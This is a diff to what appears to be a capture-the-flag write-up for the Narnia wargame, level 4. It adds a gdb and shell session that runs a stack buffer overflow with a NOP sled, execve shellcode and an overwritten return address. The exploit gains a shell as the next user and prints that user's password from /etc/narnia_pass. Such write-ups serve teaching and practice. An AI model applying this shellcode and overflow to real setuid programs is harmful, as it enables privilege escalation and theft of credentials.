@@ -128,7 +128,19 @@ Program received signal SIGSEGV, Segmentation fault.
 0xffffda40:	0x00000000	0x00000000	0x00000000	0x00000000
 0xffffda50:	0x00000000	0x00000000	0x00000000	0x00000000
 0xffffda60:	0x00000000	0x00000000	0x00000000	0x00000000  
+(gdb) r $(python -c'print "\x90"*248 +"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\xd0\xd7\xff\xff"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
 
-
+Starting program: /games/narnia/narnia4 $(python -c'print "\x90"*248 +"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\xd0\xd7\xff\xff"')
+process 8643 is executing new program: /bin/dash
+$ exit     
+[Inferior 1 (process 8643) exited normally]
+(gdb) quit  
+./narnia4 $(python -c'print "\x90"*248 +"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\xd0\xd7\xff\xff"')
+$ whoami
+narnia5
+$ cat /etc/narnia_pass/narnia5
+faimahchiy  
 
 ```
